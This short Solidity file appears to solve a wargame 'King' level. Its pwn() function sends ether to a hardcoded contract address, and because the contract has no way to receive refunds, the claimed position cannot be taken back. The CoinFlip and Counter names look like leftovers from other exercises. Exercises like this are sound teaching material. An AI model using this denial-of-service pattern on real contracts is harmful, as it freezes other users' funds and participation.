// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.7;

interface CoinFlip {}

contract Counter {
    address payable private constant coinFlipAddress =
        payable(0xF01e03f9B622E7a628CAa85495025B1430Ad1Ac6);
    CoinFlip constant coinFlipContract = CoinFlip(coinFlipAddress);


    constructor() payable {

    }

    function pwn() public {
      // send 0.0011 eth to KING. you are now the owner and King cannot be reset
      (bool sent, bytes memory data) = coinFlipAddress.call{value: 0.0011 ether}("");
      require(sent, "failed to transfer eth");
    }
}
